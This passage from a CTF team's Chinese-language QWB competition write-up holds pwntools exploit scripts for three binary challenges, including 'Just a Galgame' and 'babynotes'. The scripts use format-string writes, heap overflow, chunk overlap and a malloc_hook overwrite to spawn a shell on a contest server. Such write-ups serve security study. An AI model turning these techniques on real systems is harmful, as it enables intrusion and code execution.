</span></span><span class=line><span class=cl><span class=nb>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Stack:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>stack</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;LIBC:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=ne>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mi>231</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;LIBC:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;PROC:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>proc_base</span> <span class=o>=</span> <span class=ne>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x144C</span>
</span></span><span class=line><span class=cl><span class=nb>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Proc:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>proc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Canary:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=ne>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>18</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Canary:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>canary</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>proc_base</span>  <span class=o>+</span> <span class=mh>0x0152B</span>
</span></span><span class=line><span class=cl><span class=n>leave_ret</span> <span class=o>=</span> <span class=n>proc_base</span> <span class=o>+</span> <span class=mh>0x12E2</span>
</span></span><span class=line><span class=cl><span class=n>rce</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x10A45C</span>
</span></span><span class=line><span class=cl><span class=n>open_sys</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>read_sys</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;Hey Siri!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>off_1</span> <span class=o>=</span> <span class=p>(((</span><span class=n>stack</span> <span class=o>+</span> <span class=mh>0x50</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xFFFF</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>off_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>leave_ret</span><span class=o>&amp;</span><span class=mh>0xFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(p,&#39;b *0x5555555552A2&#39;)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>off_1</span> <span class=o>&gt;</span> <span class=n>off_2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span>  <span class=o>=</span> <span class=s1>&#39;Remind me to &#39;</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>((</span><span class=n>off_2</span> <span class=o>-</span> <span class=mi>27</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;c%55$hn&#39;</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>((</span><span class=n>off_1</span> <span class=o>-</span> <span class=n>off_2</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;c%56$hn&#39;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span>  <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x38</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rce</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span>  <span class=o>=</span> <span class=s1>&#39;Remind me to &#39;</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>((</span><span class=n>off_1</span> <span class=o>-</span> <span class=mi>27</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;c%55$hn&#39;</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>((</span><span class=n>off_2</span> <span class=o>-</span> <span class=n>off_1</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;c%56$hn&#39;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span>  <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x38</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rce</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=just-a-galgame---强网先锋>Just a Galgame - 强网先锋</h3><p>如果top_chunk的size 不够申请的大小,就会另外开辟一个top_chunk,将原先top_chunk扔进unsorted bin,切割后拿到libc_base,在case 5有个read(0,0x4040A0,8);往栈上写一个地址,然乎case 2没有对 index 索引进行一个 检测 越界修改这个地址里面的内容,即可将malloc_hook写为rce</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import*
</span></span><span class=line><span class=cl>context.log_level =&#39;DEBUG&#39;
</span></span><span class=line><span class=cl>def menu(ch):
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;&gt;&gt; &#39;,str(ch))
</span></span><span class=line><span class=cl>def new():
</span></span><span class=line><span class=cl>	menu(1)
</span></span><span class=line><span class=cl>def edit(index,name):
</span></span><span class=line><span class=cl>	menu(2)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;idx &gt;&gt;&#39;,str(index))
</span></span><span class=line><span class=cl>	p.sendafter(&#39;movie name &gt;&gt; &#39;,name)
</span></span><span class=line><span class=cl>def large():
</span></span><span class=line><span class=cl>	menu(3)
</span></span><span class=line><span class=cl>def show():
</span></span><span class=line><span class=cl>	menu(4)
</span></span><span class=line><span class=cl>def leave(say):
</span></span><span class=line><span class=cl>	menu(5)
</span></span><span class=line><span class=cl>	p.sendafter(&#39;QAQ\n&#39;,say)
</span></span><span class=line><span class=cl>p = process(&#39;./main&#39;)
</span></span><span class=line><span class=cl>p = remote(&#39;123.56.170.202&#39;,52114)
</span></span><span class=line><span class=cl>libc =ELF(&#39;./libc-2.27.so&#39;)
</span></span><span class=line><span class=cl>new()
</span></span><span class=line><span class=cl>edit(0,p64(0) + p64(0xD41))
</span></span><span class=line><span class=cl>large()
</span></span><span class=line><span class=cl>new()
</span></span><span class=line><span class=cl>show()
</span></span><span class=line><span class=cl>libc_base = u64(p.recvuntil(&#39;\x7F&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;__malloc_hook&#39;]  -0x10 - 1632
</span></span><span class=line><span class=cl>log.info(&#39;LIBC:\t&#39; + hex(libc_base))
</span></span><span class=line><span class=cl>malloc_hook = libc_base + libc.sym[&#39;__malloc_hook&#39;]
</span></span><span class=line><span class=cl>rce = libc_base + 0x10A45C
</span></span><span class=line><span class=cl>leave(p64(malloc_hook - 0x60))
</span></span><span class=line><span class=cl>edit(8,p64(rce))
</span></span><span class=line><span class=cl>new()
</span></span><span class=line><span class=cl>p.interactive()
</span></span></code></pre></td></tr></table></div></div><h3 id=babynotes---强网先锋>babynotes - 强网先锋</h3><p>因为在regset中 strcpy 可以导致堆溢出修改下一个块的size,则可构造 chunk overlap,然后往malloc_hook中写入rce</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import*
</span></span><span class=line><span class=cl>#context.log_level =&#39;DEBUG&#39;
</span></span><span class=line><span class=cl>def menu(ch):
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;&gt;&gt; &#39;,str(ch))
</span></span><span class=line><span class=cl>def new(index,size):
</span></span><span class=line><span class=cl>	menu(1)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;index:&#39;,str(index))
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;size:&#39;,str(size))
</span></span><span class=line><span class=cl>def show(index):
</span></span><span class=line><span class=cl>	menu(2)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;index:&#39;,str(index))
</span></span><span class=line><span class=cl>def free(index):
</span></span><span class=line><span class=cl>	menu(3)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;index:&#39;,str(index))
</span></span><span class=line><span class=cl>def edit(index,content):
</span></span><span class=line><span class=cl>	menu(4)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;index:&#39;,str(index))
</span></span><span class=line><span class=cl>	p.sendafter(&#39;note:&#39;,content)
</span></span><span class=line><span class=cl>def Set(name,motto,age):
</span></span><span class=line><span class=cl>	p.sendafter(&#39;name:&#39;,name)
</span></span><span class=line><span class=cl>	p.sendafter(&#39;motto:&#39;,motto)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;age:&#39;,str(age))
</span></span><span class=line><span class=cl>def check():
</span></span><span class=line><span class=cl>	menu(6)
</span></span><span class=line><span class=cl>p = process(&#39;./main&#39;)
</span></span><span class=line><span class=cl>libc =ELF(&#39;./libc-2.23.so&#39;)
</span></span><span class=line><span class=cl>p = remote(&#39;123.56.170.202&#39;,43121)
</span></span><span class=line><span class=cl>Set(&#39;FMYY&#39;,&#39;FAQ&#39;,0x21)
</span></span><span class=line><span class=cl>new(0,0x100)
</span></span><span class=line><span class=cl>new(1,0x18)
</span></span><span class=line><span class=cl>new(2,0x60)
</span></span><span class=line><span class=cl>new(3,0x60)
</span></span><span class=line><span class=cl>new(4,0x60)
</span></span><span class=line><span class=cl>free(0)
</span></span><span class=line><span class=cl>new(0,0x100)
</span></span><span class=line><span class=cl>show(0)
</span></span><span class=line><span class=cl>libc_base = u64(p.recvuntil(&#39;\x7F&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x10 - 88 - libc.sym[&#39;__malloc_hook&#39;]
</span></span><span class=line><span class=cl>log.info(&#39;LIBC:\t&#39; + hex(libc_base))
</span></span><span class=line><span class=cl>malloc_hook = libc_base + libc.sym[&#39;__malloc_hook&#39;]
</span></span><span class=line><span class=cl>rce= libc_base + 0xF1207
</span></span><span class=line><span class=cl>free(0)
</span></span><span class=line><span class=cl>free(1)
</span></span><span class=line><span class=cl>menu(5)
</span></span><span class=line><span class=cl>Set(&#39;U&#39;*0x18,&#39;FAQ&#39;,0xE1)
</span></span><span class=line><span class=cl>free(2)
</span></span><span class=line><span class=cl>new(0,0x60)
</span></span><span class=line><span class=cl>new(1,0x60) # 1 = 3
</span></span><span class=line><span class=cl>free(1)
</span></span><span class=line><span class=cl>free(0)
</span></span><span class=line><span class=cl>free(3)
</span></span><span class=line><span class=cl>new(3,0x60)
</span></span><span class=line><span class=cl>edit(3,p64(malloc_hook - 0x23))
</span></span><span class=line><span class=cl>new(0,0x60)
</span></span><span class=line><span class=cl>new(5,0x60)
</span></span><span class=line><span class=cl>new(1,0x60)
</span></span><span class=line><span class=cl>edit(1,&#39;\x00&#39;*0x13 + p64(rce))
</span></span><span class=line><span class=cl>free(0)
</span></span><span class=line><span class=cl>new(0,0x60)
</span></span><span class=line><span class=cl>p.interactive()
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/qwb/>QWB</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/wmctf-2020-su-wu/ data-toggle=tooltip data-placement=top title="WMCTF 2020 SU Write-Up">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/ntfy-2021-su-wu/ data-toggle=tooltip data-placement=top title="第四届“强网”拟态防御国际精英挑战赛 SU Write-Up">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>